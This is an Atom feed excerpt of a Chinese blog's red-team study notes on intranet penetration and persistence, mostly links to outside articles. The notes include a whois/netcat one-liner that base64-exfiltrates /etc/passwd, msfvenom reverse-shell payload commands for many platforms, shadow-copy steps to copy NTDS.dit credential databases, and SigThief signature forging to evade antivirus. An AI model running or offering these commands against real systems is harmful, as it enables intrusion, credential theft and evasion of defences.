<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iceH’s Blog</title>
  
  <subtitle>分享/干货/生活</subtitle>
  <link href="http://www.secice.cn/atom.xml" rel="self"/>
  
  <link href="http://www.secice.cn/"/>
  <updated>2021-01-04T02:50:44.178Z</updated>
  <id>http://www.secice.cn/</id>
  
  <author>
    <name>iceH</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>红队攻防学习之内网渗透基础</title>
    <link href="http://www.secice.cn/p/5a00e178"/>
    <id>http://www.secice.cn/p/5a00e178</id>
    <published>2020-12-30T05:52:16.179Z</published>
    <updated>2021-01-04T02:50:44.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="八、内网渗透基础"><a href="#八、内网渗透基础" class="headerlink" title="八、内网渗透基础"></a>八、内网渗透基础</h1><h2 id="8-1-Kerberos协议"><a href="#8-1-Kerberos协议" class="headerlink" title="8.1 Kerberos协议"></a>8.1 Kerberos协议</h2><h3 id="8-1-1-Windows认证原理之Kerberos篇"><a href="#8-1-1-Windows认证原理之Kerberos篇" class="headerlink" title="8.1.1 Windows认证原理之Kerberos篇"></a>8.1.1 Windows认证原理之Kerberos篇</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">5004</span>  ---Kerberos Securityhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/artech/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">01</span><span class="hljs-regexp">/24/</span>kerberos.html   ---Windows安全认证是如何进行的？[Kerberos篇]https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1596509</span>   --Windows认证 | 域认证https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">190261</span>   --Windows内网协议学习Kerberos篇之ASREQ&amp; ASREP （深入理解）</code></pre><p>这四篇文章，仔细看完，你会基本理解Kerberos原理…</p><hr><h2 id="8-2-NTLM"><a href="#8-2-NTLM" class="headerlink" title="8.2 NTLM"></a>8.2 NTLM</h2><h3 id="8-2-1-NTLM协议及Hash抓取"><a href="#8-2-1-NTLM协议及Hash抓取" class="headerlink" title="8.2.1 NTLM协议及Hash抓取"></a>8.2.1 NTLM协议及Hash抓取</h3><p>Windows安全认证有两种方式：Kerberos和NTLM</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6600</span>https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1480923</span></code></pre><p>这两篇诠释了NTLM协议及Hash抓取…</p><hr><h3 id="8-2-2-Windows认证原理之NTLM篇"><a href="#8-2-2-Windows认证原理之NTLM篇" class="headerlink" title="8.2.2 Windows认证原理之NTLM篇"></a>8.2.2 Windows认证原理之NTLM篇</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587410</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4435334</span>   ---Windows认证原理入门篇https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">193149</span>   ---Windows内网协议学习NTLM篇之NTLM基础介绍https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-qing-/</span>p/<span class="hljs-number">11343859</span>.html   ---域渗透基础之NTLM认证协议</code></pre><p>书上只是基础的讲解了，这里三篇文章详细深入的讲解了NTLM</p><hr><h2 id="8-3-内网命令行渗透笔记"><a href="#8-3-内网命令行渗透笔记" class="headerlink" title="8.3 内网命令行渗透笔记"></a>8.3 内网命令行渗透笔记</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">10336247</span>.html  https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1665868</span>https:<span class="hljs-regexp">//</span>www.mi1k7ea.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/27/</span>内网信息收集之本机信息收集/https:<span class="hljs-regexp">//uu</span>zdaisuki.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">05</span><span class="hljs-regexp">/05/</span>内网渗透常用命令总结（windows）/https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4399281</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">3581418</span></code></pre><p>这里集合很多，学会就基本差不多了，我的笔记我不透漏了，大部分是htb上集合的和文章里的…</p><hr><h2 id="8-4-内网渗透中的文件传输"><a href="#8-4-内网渗透中的文件传输" class="headerlink" title="8.4 内网渗透中的文件传输"></a>8.4 内网渗透中的文件传输</h2><p><strong>利用whois传输文件：</strong></p><p>传输机：</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@john:~# whois -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">4444</span> `cat /etc/passwd | base<span class="hljs-number">64</span>`</code></pre><p>接受机：</p><pre><code class="hljs awk">root@john:<span class="hljs-regexp">/tmp# nc -l -v -p 4444 | sed &quot;s/</span> <span class="hljs-regexp">//g</span><span class="hljs-string">&quot; | base64 -d</span></code></pre><p>优点：适用于隐蔽传输。最小化被发现。<br>缺点：适用于传输小文件。</p><hr><h2 id="8-5-msfvenom常用生成payload命令"><a href="#8-5-msfvenom常用生成payload命令" class="headerlink" title="8.5 msfvenom常用生成payload命令"></a>8.5 msfvenom常用生成payload命令</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a><strong>windows:</strong></h3><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -a x<span class="hljs-number">86</span> --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x<span class="hljs-number">86</span>/shikata_ga_nai -b &#x27;x<span class="hljs-number">00</span>x<span class="hljs-number">0</span>axff&#x27; -i <span class="hljs-number">3</span> -f exe -opayload.exe</code></pre><h3 id="mac"><a href="#mac" class="headerlink" title="mac:"></a><strong>mac:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP<span class="hljs-attribute">LPORT</span>=攻击机端口 -f macho -o payload.macho</code></pre><h3 id="android"><a href="#android" class="headerlink" title="android:"></a><strong>android:</strong></h3><pre><code class="hljs awk"><span class="hljs-regexp">//</span>需要签名msfvenom -a x86 --platform Android -p android<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell:"></a><strong>powershell:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -e cmd/powershell_base64 -i 3 -f<span class="hljs-built_in"> raw </span>-o payload.ps1</code></pre><h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a><strong>linux:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f elf -o payload.elf</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php:"></a><strong>php:</strong></h3><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx:"></a><strong>aspx:</strong></h3><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</code></pre><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp:"></a><strong>jsp:</strong></h3><pre><code class="hljs routeros">msfvenom --platform java -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.jsp</code></pre><h3 id="war"><a href="#war" class="headerlink" title="war:"></a><strong>war:</strong></h3><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.war</code></pre><h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs:"></a><strong>nodejs:</strong></h3><pre><code class="hljs routeros">msfvenom -p nodejs/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.js</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python:"></a><strong>python:</strong></h3><pre><code class="hljs routeros">msfvenom -p python/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.py</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl:"></a><strong>perl:</strong></h3><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.pl</code></pre><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby:"></a><strong>ruby:</strong></h3><pre><code class="hljs routeros">msfvenom -p ruby/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.rb</code></pre><h3 id="lua"><a href="#lua" class="headerlink" title="lua:"></a><strong>lua:</strong></h3><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_lua <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.lua</code></pre><h3 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode:"></a><strong>windows shellcode:</strong></h3><pre><code class="hljs awk">msfvenom -a x86 --platform Windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><h3 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode:"></a><strong>linux shellcode:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f c</code></pre><h3 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode:"></a><strong>mac shellcode:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP<span class="hljs-attribute">LPORT</span>=攻击机端口 -f c</code></pre><h3 id="便捷化payload生成"><a href="#便捷化payload生成" class="headerlink" title="便捷化payload生成:"></a><strong>便捷化payload生成:</strong></h3><p>项目地址:</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Screetsec/</span>TheFatRat</code></pre><pre><code class="hljs awk">root@John:~<span class="hljs-regexp">/Desktop# git clone https:/</span><span class="hljs-regexp">/github.com/</span>Screetsec/TheFatRat.git<span class="hljs-regexp">//</span>设置时需要挂墙</code></pre><p><strong>附录:</strong><br><strong>中文使用说明:</strong><br><strong>Options:</strong></p><pre><code class="hljs livecodeserver">-p, <span class="hljs-comment">--payload &lt;payload&gt; 使用指定的payload</span><span class="hljs-comment">--payload-options 列出该payload参数</span>-l, <span class="hljs-comment">--list [type] 列出所有的payloads</span>-n, <span class="hljs-comment">--nopsled &lt;length&gt; 为payload指定一个 nopsled 长度</span>-f, <span class="hljs-comment">--format &lt;format&gt; 指定payload生成格式</span><span class="hljs-comment">--help-formats 查看所有支持格式</span>-e, <span class="hljs-comment">--encoder &lt;encoder&gt; 使用编码器</span>-<span class="hljs-keyword">a</span>, <span class="hljs-comment">--arch &lt;arch&gt; 指定payload构架</span><span class="hljs-comment">--platform &lt;platform&gt; 指定payload平台</span><span class="hljs-comment">--help-platforms 显示支持的平台</span>-s, <span class="hljs-comment">--space &lt;length&gt; 设定payload攻击荷载的最大长度</span><span class="hljs-comment">--encoder-space &lt;length&gt; The maximum size of the encoded payload</span>(defaults <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> -s <span class="hljs-built_in">value</span>)-b, <span class="hljs-comment">--bad-chars &lt;list&gt; 指定bad-chars 如: &#x27;x00xff&#x27;</span>-i, <span class="hljs-comment">--iterations &lt;count&gt; 指定编码次数</span>-c, <span class="hljs-comment">--add-code &lt;path&gt; 指定个win32 shellcode 文件</span>-x, <span class="hljs-comment">--template &lt;path&gt; 指定一个 executable 文件作为模板</span>-k, <span class="hljs-comment">--keep payload自动分离并注入到新的进程</span>-o, <span class="hljs-comment">--out &lt;path&gt; 存放生成的payload</span>-v, <span class="hljs-comment">--var-name &lt;name&gt; 指定自定义变量</span><span class="hljs-comment">--smallest Generate the smallest possible payload</span>-h, <span class="hljs-comment">--help 显示帮助文件</span></code></pre><pre><code class="hljs css"><span class="hljs-selector-tag">https</span>://<span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.kanxue</span><span class="hljs-selector-class">.com</span>/<span class="hljs-selector-tag">book-38-445</span><span class="hljs-selector-class">.htm</span>   高级渗透第十课</code></pre><hr><h2 id="8-6-windows环境压缩文件-amp-文件夹命令合集"><a href="#8-6-windows环境压缩文件-amp-文件夹命令合集" class="headerlink" title="8.6 windows环境压缩文件&amp;文件夹命令合集"></a>8.6 windows环境压缩文件&amp;文件夹命令合集</h2><p>本篇文章会介绍几种常用的 windows打包、压缩文件&amp;文件夹的方法。</p><p><strong>压缩工具 Winrar</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/u2s1/</span>winrarsc</code></pre><p>实际使用情况,直接把 Winrar.exe上传至目标机即可, Winrar大约400k。</p><p>常用压缩命令为 :</p><pre><code class="hljs stylus">C:\RECYCLER\Winrar<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">a</span> -k -r -s -m5 tmp<span class="hljs-selector-class">.rar</span> srcdir</code></pre><p>常用解压命令为：</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\R</span>ECYCLER<span class="hljs-symbol">\W</span>inrar.exe x -t -o -p d:<span class="hljs-symbol">\w</span>eb.rar d:<span class="hljs-symbol">\d</span>esdirdesdir文件夹需存在</code></pre><hr><p><strong>压缩工具7za</strong></p><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www<span class="hljs-number">.7</span>-zip<span class="hljs-meta">.org</span>   --官网</code></pre><p>7za常用命令<br>查看压缩文件内容(如判断目标机上压缩文件是否有价值)</p><pre><code class="hljs aspectj"><span class="hljs-number">7</span>za l <span class="hljs-keyword">target</span>.zip</code></pre><p>常用压缩命令如下</p><p>按照默认压缩类型进行压缩,7za会自动遍历所压缩文件夹内的子文件、子文件夹，默认压缩类型为7z即参数-a -t7z，其中-mx9为7z模式中UItra compressing</p><pre><code class="hljs apache"><span class="hljs-attribute">7za</span> a -mx=<span class="hljs-number">9</span> archive<span class="hljs-number">1</span>.zip test</code></pre><p>如果需要使用其他压缩类型，如zip</p><pre><code class="hljs stata">7za a -tzip archive1.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span></code></pre><p>常用解压缩命令如下，too文件夹7za自动创建。</p><pre><code class="hljs taggerscript">7za x tmp.7z c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\t</span>ool</code></pre><p>或者压缩文件、文件夹时，需排除某些文件夹，不压缩上面-x 后面的文件夹内文件，文件夹名有空格需用双引号引起来，命令如下</p><p>排除文件</p><pre><code class="hljs apache"><span class="hljs-attribute">7za</span> a archive<span class="hljs-number">1</span>.zip test -x!treeNMS-<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">4</span>.zip</code></pre><p>排除文件夹</p><pre><code class="hljs stata">7za a archive1.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">test</span> -xr!serverbak</code></pre><hr><p><strong>使用 windows自带压缩文件命令</strong></p><p><strong>makecab压缩文件命令</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/hkmax/</span>blog/<span class="hljs-number">144293</span>   --makecab 方法</code></pre><p>makecab可压缩单个文件或多个文件,但无法压缩文件夹压缩单个文件命令为</p><pre><code class="hljs apache"><span class="hljs-attribute">makecab</span> <span class="hljs-number">1</span>. txt <span class="hljs-number">1</span>.zip</code></pre><p><strong>expand解压缩命令</strong></p><p>解压缩test1.cab至c:\windows\temp\tool目录，tool目录必须存在</p><pre><code class="hljs taggerscript">expand D:<span class="hljs-symbol">\d</span>ayu<span class="hljs-symbol">\t</span>est1.cab -f:* c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\t</span>ool</code></pre><p><strong>zip.vbs解压方法</strong></p><p>windows文件管理器自带压缩、解压缩功能( zipped)，属于explorer的功能，无法命令行调用，具体介绍传送门( <a href="https://filext.com/faq/compressed_zip_folder.html)%EF%BC%8C%E6%AD%A4%E5%A4%84zip.vbs%E4%B8%BA%E8%B0%83%E7%94%A8COM%E6%8E%A5%E5%8F%A3%E4%BB%8E%E8%80%8C%E8%B0%83%E7%94%A8%E8%87%AA%E5%B8%A6%E7%9A%84">https://filext.com/faq/compressed_zip_folder.html)，此处zip.vbs为调用COM接口从而调用自带的</a> explorer zip</p><p>压缩文件命令为</p><pre><code class="hljs stata"><span class="hljs-keyword">CScript</span> <span class="hljs-keyword">zip</span>.vbs C:\<span class="hljs-keyword">test</span> C:\target.<span class="hljs-keyword">zip</span></code></pre><p><strong>powershell缩文件夹</strong></p><p>将文件或文件夹test压缩为test.zip</p><pre><code class="hljs mathematica"><span class="hljs-variable">powershell</span> <span class="hljs-built_in">Compress</span><span class="hljs-operator">-</span><span class="hljs-variable">Archive</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-built_in">D</span><span class="hljs-operator">:</span>\<span class="hljs-variable">test</span> <span class="hljs-operator">-</span><span class="hljs-variable">DestinationPath</span> <span class="hljs-built_in">E</span><span class="hljs-operator">:</span>\<span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span></code></pre><p>将文件test.zip解压到test目录下</p><pre><code class="hljs stata">powershell <span class="hljs-keyword">Expand</span>-Archive -Path <span class="hljs-keyword">E</span>:\<span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> -DestinationPath F:\<span class="hljs-keyword">test</span></code></pre><hr><h2 id="8-7-Windows-net-命令集使用"><a href="#8-7-Windows-net-命令集使用" class="headerlink" title="8.7 Windows net 命令集使用"></a>8.7 Windows net 命令集使用</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/iriczhao/</span>p/<span class="hljs-number">10469143</span>.htmlhttps:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1459966</span>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>b35078a6f030</code></pre><p>认真看完知道有个概念即可！！！</p><hr><h2 id="8-8-Cobaltstrike与Metasploit实战联动"><a href="#8-8-Cobaltstrike与Metasploit实战联动" class="headerlink" title="8.8 Cobaltstrike与Metasploit实战联动"></a>8.8 Cobaltstrike与Metasploit实战联动</h2><ul><li><a href="https://my.oschina.net/u/4304822/blog/3328524">https://my.oschina.net/u/4304822/blog/3328524</a></li></ul><hr><h2 id="8-9-渗透中常用的复制工具"><a href="#8-9-渗透中常用的复制工具" class="headerlink" title="8.9 渗透中常用的复制工具"></a>8.9 渗透中常用的复制工具</h2><p>在渗透中经常需要复制像NTDS.dit、mssql数据库文件等关键文件。由于这些文件都被占用,所以不能直接复制。下面介绍几个常用的命令or工具来实现复制</p><h3 id="VSSadmin"><a href="#VSSadmin" class="headerlink" title="VSSadmin"></a><strong>VSSadmin</strong></h3><p>域环境默认安装。</p><p><strong>使用：</strong></p><p>创建卷影</p><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=c:</code></pre><p>获取当前卷影</p><pre><code class="hljs ebnf"><span class="hljs-attribute">vssadmin list shadow</span></code></pre><p>从卷影复制文件</p><pre><code class="hljs taggerscript">copy <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy2<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\N</span>TDS<span class="hljs-symbol">\n</span>tds.dit c:<span class="hljs-symbol">\n</span>tds.dit</code></pre><p>删除卷影</p><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet</code></pre><hr><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a><strong>ntdsutil</strong></h3><p>域环境默认安装</p><p>创建快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;activate instance ntds&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><p>挂载快照</p><pre><code class="hljs subunit">ntdsutil snapshot &quot;mount &#123;22508acf<span class="hljs-string">-8</span>a01<span class="hljs-string">-4322</span><span class="hljs-string">-867</span>d<span class="hljs-string">-383</span>cf78f59e3&#125; quit quit快照挂载为C:\$SNAP_201912231558_V0LUMEC$\，copy ntds即可</code></pre><p>卸载快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;unmount &#123;22508acf-8a01-4322-867d-383cf78f59e3&#125;&quot;</span> <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><p>删除快照</p><pre><code class="hljs mel">ntdsutil <span class="hljs-keyword">snapshot</span> <span class="hljs-string">&quot;delete &#123;22508acf-8a01-4322-867d-383cf78f59e3&#125;&quot;</span> create <span class="hljs-keyword">quit</span> <span class="hljs-keyword">quit</span></code></pre><hr><h3 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a><strong>Vshadow</strong></h3><p>不是系统默认工具，可在Microsoft SDK中获取</p><p>创建快照</p><pre><code class="hljs stylus">vshadow<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> -nw C:</code></pre><p>获取快照列表</p><pre><code class="hljs css"><span class="hljs-selector-tag">vshadow</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-q</span></code></pre><p>复制</p><pre><code class="hljs mipsasm">copy <span class="hljs-keyword">Shadow </span>copy device <span class="hljs-string">&quot;Name&quot;</span>\windows\NTDS\ntds.<span class="hljs-keyword">dit </span>c:\ntds.<span class="hljs-keyword">dit </span></code></pre><p>删除快照</p><pre><code class="hljs dust"><span class="xml">vshadow -ds=</span><span class="hljs-template-variable">&#123;ID&#125;</span></code></pre><h3 id="Ninjacopy"><a href="#Ninjacopy" class="headerlink" title="Ninjacopy"></a><strong>Ninjacopy</strong></h3><p>ninjacopy是powersploit中的一个powershell脚本直接使用 Invoke-NinjaCopy -Path &lt;需要复制的文件&gt; -LocalDestination &lt;复制文件保存位置&gt; 即可复制</p><p><strong>VolumeShadowCopyTools</strong></p><p>属于powersploit的项目，地址VolumeShadowCopyTools，之前遇到上面介绍的方法都不能复制数据库文件，使用这个工具成功复制</p><p>创建卷影</p><pre><code class="hljs dockerfile">New-VolumeShadowCopy -<span class="hljs-keyword">Volume</span><span class="bash"> C:\</span></code></pre><p>列出卷影</p><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-VolumeShadowCopy</span></code></pre><p>挂载卷影</p><pre><code class="hljs taggerscript">Mount-VolumeShadowCopy -Path C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>ublic -DevicePath <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1   可直接在挂载点操作了</code></pre><p>卸载卷影</p><pre><code class="hljs taggerscript">Remove-VolumeShadowCopy -DevicePath <span class="hljs-symbol">\\</span>?<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;八、内网渗透基础&quot;&gt;&lt;a href=&quot;#八、内网渗透基础&quot; class=&quot;headerlink&quot; title=&quot;八、内网渗透基础&quot;&gt;&lt;/a&gt;八、内网渗透基础&lt;/h1&gt;&lt;h2 id=&quot;8-1-Kerberos协议&quot;&gt;&lt;a href=&quot;#8-1-Kerberos协议&quot;</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之权限维持</title>
    <link href="http://www.secice.cn/p/efc8f01a"/>
    <id>http://www.secice.cn/p/efc8f01a</id>
    <published>2020-12-30T05:41:46.000Z</published>
    <updated>2020-12-30T05:51:19.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="七、权限维持"><a href="#七、权限维持" class="headerlink" title="七、权限维持"></a>七、权限维持</h1><h2 id="7-1-操作系统后门"><a href="#7-1-操作系统后门" class="headerlink" title="7.1 操作系统后门"></a>7.1 操作系统后门</h2><h3 id="7-1-1-Linux"><a href="#7-1-1-Linux" class="headerlink" title="7.1.1 Linux"></a>7.1.1 Linux</h3><p>参考文章：<code>https://cloud.tencent.com/developer/article/1666643</code></p><hr><h3 id="7-1-2-Windows"><a href="#7-1-2-Windows" class="headerlink" title="7.1.2 Windows"></a>7.1.2 Windows</h3><h4 id="7-1-2-1-对抗权限长期把控-伪造无效签名"><a href="#7-1-2-1-对抗权限长期把控-伪造无效签名" class="headerlink" title="7.1.2.1 对抗权限长期把控-伪造无效签名"></a>7.1.2.1 对抗权限长期把控-伪造无效签名</h4><p>Github：<code>https://github.com/secretsquirrel/SigThief</code></p><p><strong>简介：</strong></p><p>在实战中，尤其是需要长期控制的目标，除免杀对抗安全软件以外，还需考虑人为无 意查看恶意文件，如数字签名是否拥有。而许多安全软件，又仅仅验证是否有签名，而非验 证签名是否有效。那么针对重要的目标，需要提前做多重对抗准备。</p><p>伪造无效签名payload：</p><pre><code class="hljs stylus">sigthief<span class="hljs-selector-class">.py</span> ‐<span class="hljs-selector-tag">i</span> 有签名的文件<span class="hljs-selector-class">.exe</span> ‐t 没签名的文件<span class="hljs-selector-class">.exe</span> ‐o 新的文件名<span class="hljs-selector-class">.exe</span></code></pre><p>许多安全软件，仅仅是验证是否有数字签名，而不确认是否有效</p><p>该原始python在伪造证书时，需要注意2点：</p><p>原始证书文件需要对应目标机的机器版本以及位数，如目标机是Windows 2003，那么需要原始带证书文件也为Windows 2003的文件。包括第三方文件。</p><p>伪造证书后，例：在Windows 2003 开启验安全验证后，双击无法运行，也无报 错，需要命令行下执行即可。</p><h4 id="7-1-2-2-常见windows持久控制总结"><a href="#7-1-2-2-常见windows持久控制总结" class="headerlink" title="7.1.2.2 常见windows持久控制总结"></a>7.1.2.2 常见windows持久控制总结</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.sins7.cn<span class="hljs-regexp">/summary-of-windows-persistence-backdoor-for-intranet-penetration/</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">229209</span>.html</code></pre><hr><h4 id="7-1-2-3-Windows-RID劫持"><a href="#7-1-2-3-Windows-RID劫持" class="headerlink" title="7.1.2.3 Windows RID劫持"></a>7.1.2.3 Windows RID劫持</h4><p>Rid_Hijack模块是一个关于后渗透阶段用来维持权限的模块…利用</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2998</span>https:<span 